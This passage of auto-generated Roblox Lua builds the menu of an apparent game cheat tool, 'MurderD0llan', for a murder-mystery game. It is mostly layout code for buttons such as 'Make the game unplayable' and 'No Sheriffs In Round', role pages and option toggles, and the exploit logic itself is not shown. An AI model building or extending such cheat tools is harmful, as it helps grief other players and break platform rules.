G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["59"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["59"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["59"]["Name"] = [[MakeTheGameUnplayable]];
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Text"] = [[Make the game unplayable  ]];
G2L["59"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.MakeTheGameUnplayable.Frame
G2L["5a"] = Instance.new("Frame", G2L["59"]);
G2L["5a"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["5a"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["5a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5a"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.MakeTheGameUnplayable.UIGradient
G2L["5b"] = Instance.new("UIGradient", G2L["59"]);
G2L["5b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.NoSheriffsInRound
G2L["5c"] = Instance.new("TextButton", G2L["b"]);
G2L["5c"]["TextWrapped"] = true;
G2L["5c"]["TextStrokeTransparency"] = 0;
G2L["5c"]["BorderSizePixel"] = 0;
G2L["5c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["TextXAlignment"] = Enum.TextXAlignment.Right;
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["TextSize"] = 21;
G2L["5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["5c"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["5c"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["5c"]["Name"] = [[NoSheriffsInRound]];
G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["Text"] = [[No Sheriffs In Round  ]];
G2L["5c"]["Position"] = UDim2.new(0.09183673560619354, 0, 0.1088709682226181, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.NoSheriffsInRound.Frame
G2L["5d"] = Instance.new("Frame", G2L["5c"]);
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(255, 0, 5);
G2L["5d"]["Size"] = UDim2.new(0, 24, 0, 20);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["Position"] = UDim2.new(0.02500000037252903, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.page_1.NoSheriffsInRound.UIGradient
G2L["5e"] = Instance.new("UIGradient", G2L["5c"]);
G2L["5e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.Pages
G2L["5f"] = Instance.new("Frame", G2L["a"]);
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["BackgroundTransparency"] = 1;
G2L["5f"]["Size"] = UDim2.new(0, 121, 0, 250);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Position"] = UDim2.new(0.7683397531509399, 0, -0.004002616740763187, 0);
G2L["5f"]["Name"] = [[Pages]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.Pages.Main
G2L["60"] = Instance.new("TextButton", G2L["5f"]);
G2L["60"]["TextWrapped"] = true;
G2L["60"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["60"]["TextSize"] = 14;
G2L["60"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["60"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["Size"] = UDim2.new(0, 77, 0, 28);
G2L["60"]["Name"] = [[Main]];
G2L["60"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["60"]["Text"] = [[Main]];
G2L["60"]["Position"] = UDim2.new(0.11343560367822647, 0, 0.04437548667192459, 0);
-- Attributes
G2L["60"]:SetAttribute([[SELECTED_PAGE]], [[page_1]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.Pages.Target
G2L["61"] = Instance.new("TextButton", G2L["5f"]);
G2L["61"]["TextWrapped"] = true;
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["61"]["TextSize"] = 14;
G2L["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["61"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["Size"] = UDim2.new(0, 77, 0, 28);
G2L["61"]["Name"] = [[Target]];
G2L["61"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["Text"] = [[Target]];
G2L["61"]["Position"] = UDim2.new(0.11343560367822647, 0, 0.18437549471855164, 0);
-- Attributes
G2L["61"]:SetAttribute([[SELECTED_PAGE]], [[page_2]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.Pages.Murder
G2L["62"] = Instance.new("TextButton", G2L["5f"]);
G2L["62"]["TextWrapped"] = true;
G2L["62"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["62"]["TextSize"] = 14;
G2L["62"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["Size"] = UDim2.new(0, 77, 0, 28);
G2L["62"]["Name"] = [[Murder]];
G2L["62"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["Text"] = [[Murder]];
G2L["62"]["Position"] = UDim2.new(0.11343560367822647, 0, 0.3203755021095276, 0);
-- Attributes
G2L["62"]:SetAttribute([[SELECTED_PAGE]], [[page_3]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.Pages.Sherrif
G2L["63"] = Instance.new("TextButton", G2L["5f"]);
G2L["63"]["TextWrapped"] = true;
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["63"]["TextSize"] = 14;
G2L["63"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["63"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["Size"] = UDim2.new(0, 77, 0, 28);
G2L["63"]["Name"] = [[Sherrif]];
G2L["63"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["Text"] = [[Sherrif]];
G2L["63"]["Position"] = UDim2.new(0.11343560367822647, 0, 0.46037548780441284, 0);
-- Attributes
G2L["63"]:SetAttribute([[SELECTED_PAGE]], [[page_4]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.Pages.Innocent
G2L["64"] = Instance.new("TextButton", G2L["5f"]);
G2L["64"]["TextWrapped"] = true;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["64"]["TextSize"] = 14;
G2L["64"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["64"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["Size"] = UDim2.new(0, 77, 0, 28);
G2L["64"]["Name"] = [[Innocent]];
G2L["64"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["Text"] = [[Innocent]];
G2L["64"]["Position"] = UDim2.new(0.11343560367822647, 0, 0.5963754653930664, 0);
-- Attributes
G2L["64"]:SetAttribute([[SELECTED_PAGE]], [[page_5]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.Pages.Options
G2L["65"] = Instance.new("TextButton", G2L["5f"]);
G2L["65"]["TextWrapped"] = true;
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["65"]["TextSize"] = 14;
G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["65"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["Size"] = UDim2.new(0, 77, 0, 28);
G2L["65"]["Name"] = [[Options]];
G2L["65"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["Text"] = [[Options]];
G2L["65"]["Position"] = UDim2.new(0.11343560367822647, 0, 0.7323755025863647, 0);
-- Attributes
G2L["65"]:SetAttribute([[SELECTED_PAGE]], [[ALT_page_options]]);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options
G2L["66"] = Instance.new("ScrollingFrame", G2L["a"]);
G2L["66"]["Active"] = true;
G2L["66"]["BorderSizePixel"] = 0;
G2L["66"]["CanvasSize"] = UDim2.new(0, 0, 0, 970);
G2L["66"]["TopImage"] = [[]];
G2L["66"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["66"]["BackgroundTransparency"] = 0.9599999785423279;
G2L["66"]["Size"] = UDim2.new(0, 367, 0, 228);
G2L["66"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["66"]["Position"] = UDim2.new(0, 0, -6.667785612535226e-08, 0);
G2L["66"]["Visible"] = false;
G2L["66"]["Name"] = [[ALT_page_options]];
G2L["66"]["BottomImage"] = [[]];

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.UIListLayout
G2L["67"] = Instance.new("UIListLayout", G2L["66"]);
G2L["67"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["67"]["Padding"] = UDim.new(0, 5);
G2L["67"]["SortOrder"] = Enum.SortOrder.LayoutOrder;

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.ThemeSelector
G2L["68"] = Instance.new("TextButton", G2L["66"]);
G2L["68"]["TextWrapped"] = true;
G2L["68"]["TextStrokeTransparency"] = 0;
G2L["68"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["68"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["68"]["TextSize"] = 20;
G2L["68"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["68"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["68"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["68"]["Name"] = [[ThemeSelector]];
G2L["68"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["68"]["Text"] = [[  Theme - Original]];
G2L["68"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.ThemeSelector.UIGradient
G2L["69"] = Instance.new("UIGradient", G2L["68"]);
G2L["69"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.ThemeSelector.change
G2L["6a"] = Instance.new("TextButton", G2L["68"]);
G2L["6a"]["TextWrapped"] = true;
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["6a"]["TextSize"] = 14;
G2L["6a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["6a"]["Name"] = [[change]];
G2L["6a"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["Text"] = [[change]];
G2L["6a"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.DragSpeed
G2L["6b"] = Instance.new("TextButton", G2L["66"]);
G2L["6b"]["TextWrapped"] = true;
G2L["6b"]["TextStrokeTransparency"] = 0;
G2L["6b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["6b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6b"]["TextSize"] = 20;
G2L["6b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6b"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["6b"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["6b"]["Name"] = [[DragSpeed]];
G2L["6b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6b"]["Text"] = [[  Drag Speed - 0.25x]];
G2L["6b"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.DragSpeed.UIGradient
G2L["6c"] = Instance.new("UIGradient", G2L["6b"]);
G2L["6c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.DragSpeed.change
G2L["6d"] = Instance.new("TextButton", G2L["6b"]);
G2L["6d"]["TextWrapped"] = true;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["6d"]["TextSize"] = 14;
G2L["6d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["6d"]["Name"] = [[change]];
G2L["6d"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["Text"] = [[change]];
G2L["6d"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.DragEnabled
G2L["6e"] = Instance.new("TextButton", G2L["66"]);
G2L["6e"]["TextWrapped"] = true;
G2L["6e"]["TextStrokeTransparency"] = 0;
G2L["6e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["6e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6e"]["TextSize"] = 20;
G2L["6e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["6e"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["6e"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["6e"]["Name"] = [[DragEnabled]];
G2L["6e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6e"]["Text"] = [[  Drag - True]];
G2L["6e"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.DragEnabled.UIGradient
G2L["6f"] = Instance.new("UIGradient", G2L["6e"]);
G2L["6f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.DragEnabled.change
G2L["70"] = Instance.new("TextButton", G2L["6e"]);
G2L["70"]["TextWrapped"] = true;
G2L["70"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["70"]["TextSize"] = 14;
G2L["70"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["70"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["70"]["Name"] = [[change]];
G2L["70"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["70"]["Text"] = [[Toggle]];
G2L["70"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.CenterButtonEnabled
G2L["71"] = Instance.new("TextButton", G2L["66"]);
G2L["71"]["TextWrapped"] = true;
G2L["71"]["TextStrokeTransparency"] = 0;
G2L["71"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["71"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["71"]["TextSize"] = 16;
G2L["71"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["71"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["71"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["71"]["Name"] = [[CenterButtonEnabled]];
G2L["71"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["71"]["Text"] = [[  center position button - false]];
G2L["71"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.CenterButtonEnabled.UIGradient
G2L["72"] = Instance.new("UIGradient", G2L["71"]);
G2L["72"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.CenterButtonEnabled.change
G2L["73"] = Instance.new("TextButton", G2L["71"]);
G2L["73"]["TextWrapped"] = true;
G2L["73"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["73"]["TextSize"] = 14;
G2L["73"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["73"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["73"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["73"]["Name"] = [[change]];
G2L["73"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["73"]["Text"] = [[Toggle]];
G2L["73"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextLabel
G2L["74"] = Instance.new("TextLabel", G2L["66"]);
G2L["74"]["TextWrapped"] = true;
G2L["74"]["BorderSizePixel"] = 0;
G2L["74"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["74"]["TextSize"] = 16;
G2L["74"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["74"]["Size"] = UDim2.new(0, 356, 0, 23);
G2L["74"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["74"]["Text"] = [[- - - - - - - -  - - - - -Notifications - - - - -  - - - - -  -  ]];
G2L["74"]["BackgroundTransparency"] = 1;
G2L["74"]["Position"] = UDim2.new(0.25671717524528503, 0, 0.518768310546875, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1DFT
G2L["75"] = Instance.new("TextButton", G2L["66"]);
G2L["75"]["TextWrapped"] = true;
G2L["75"]["TextStrokeTransparency"] = 0;
G2L["75"]["BorderSizePixel"] = 0;
G2L["75"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["75"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["75"]["TextSize"] = 20;
G2L["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["75"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["75"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["75"]["Name"] = [[TextBoxButton1DFT]];
G2L["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["75"]["Text"] = [[  Default Fade Time]];
G2L["75"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.8508771657943726, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1DFT.UIGradient
G2L["76"] = Instance.new("UIGradient", G2L["75"]);
G2L["76"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1DFT.TextBox
G2L["77"] = Instance.new("TextBox", G2L["75"]);
G2L["77"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["77"]["TextSize"] = 14;
G2L["77"]["TextWrapped"] = true;
G2L["77"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["77"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["77"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["77"]["PlaceholderText"] = [[enter...]];
G2L["77"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["77"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["77"]["Text"] = [[]];
G2L["77"]["Position"] = UDim2.new(0.7409999966621399, 0, 0.17599999904632568, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1ND
G2L["78"] = Instance.new("TextButton", G2L["66"]);
G2L["78"]["TextWrapped"] = true;
G2L["78"]["TextStrokeTransparency"] = 0;
G2L["78"]["BorderSizePixel"] = 0;
G2L["78"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["78"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["78"]["TextSize"] = 20;
G2L["78"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["78"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["78"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["78"]["Name"] = [[TextBoxButton1ND]];
G2L["78"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["78"]["Text"] = [[  Notification Duration]];
G2L["78"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.8508771657943726, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1ND.UIGradient
G2L["79"] = Instance.new("UIGradient", G2L["78"]);
G2L["79"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1ND.TextBox
G2L["7a"] = Instance.new("TextBox", G2L["78"]);
G2L["7a"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["7a"]["TextSize"] = 14;
G2L["7a"]["TextWrapped"] = true;
G2L["7a"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["7a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7a"]["PlaceholderText"] = [[enter...]];
G2L["7a"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7a"]["Text"] = [[]];
G2L["7a"]["Position"] = UDim2.new(0.7409999966621399, 0, 0.17599999904632568, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1MVN
G2L["7b"] = Instance.new("TextButton", G2L["66"]);
G2L["7b"]["TextWrapped"] = true;
G2L["7b"]["TextStrokeTransparency"] = 0;
G2L["7b"]["BorderSizePixel"] = 0;
G2L["7b"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7b"]["TextSize"] = 20;
G2L["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7b"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["7b"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["7b"]["Name"] = [[TextBoxButton1MVN]];
G2L["7b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7b"]["Text"] = [[  Max Visible Notifications]];
G2L["7b"]["Position"] = UDim2.new(0.06403269618749619, 0, 0.8508771657943726, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1MVN.UIGradient
G2L["7c"] = Instance.new("UIGradient", G2L["7b"]);
G2L["7c"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextBoxButton1MVN.TextBox
G2L["7d"] = Instance.new("TextBox", G2L["7b"]);
G2L["7d"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["7d"]["TextSize"] = 14;
G2L["7d"]["TextWrapped"] = true;
G2L["7d"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["7d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7d"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["7d"]["PlaceholderText"] = [[enter...]];
G2L["7d"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["7d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7d"]["Text"] = [[]];
G2L["7d"]["Position"] = UDim2.new(0.7409999966621399, 0, 0.17599999904632568, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.AllowNotification
G2L["7e"] = Instance.new("TextButton", G2L["66"]);
G2L["7e"]["TextWrapped"] = true;
G2L["7e"]["TextStrokeTransparency"] = 0;
G2L["7e"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["7e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["7e"]["TextSize"] = 20;
G2L["7e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["7e"]["TextColor3"] = Color3.fromRGB(99, 99, 99);
G2L["7e"]["Size"] = UDim2.new(0, 320, 0, 34);
G2L["7e"]["Name"] = [[AllowNotification]];
G2L["7e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["7e"]["Text"] = [[  Allow Notifications - true]];
G2L["7e"]["Position"] = UDim2.new(0.06403269618749619, 0, -6.692451393064403e-08, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.AllowNotification.UIGradient
G2L["7f"] = Instance.new("UIGradient", G2L["7e"]);
G2L["7f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(112, 112, 112)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 255, 255))};

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.AllowNotification.change
G2L["80"] = Instance.new("TextButton", G2L["7e"]);
G2L["80"]["TextWrapped"] = true;
G2L["80"]["BackgroundColor3"] = Color3.fromRGB(72, 72, 72);
G2L["80"]["TextSize"] = 14;
G2L["80"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["80"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["Size"] = UDim2.new(0, 66, 0, 22);
G2L["80"]["Name"] = [[change]];
G2L["80"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["80"]["Text"] = [[Toggle]];
G2L["80"]["Position"] = UDim2.new(0.7406250238418579, 0, 0.1764705926179886, 0);

-- StarterGui.MurderD0llan.MainWindow.ContentArea.ALT_page_options.TextLabel
G2L["81"] = Instance.new("TextLabel", G2L["66"]);
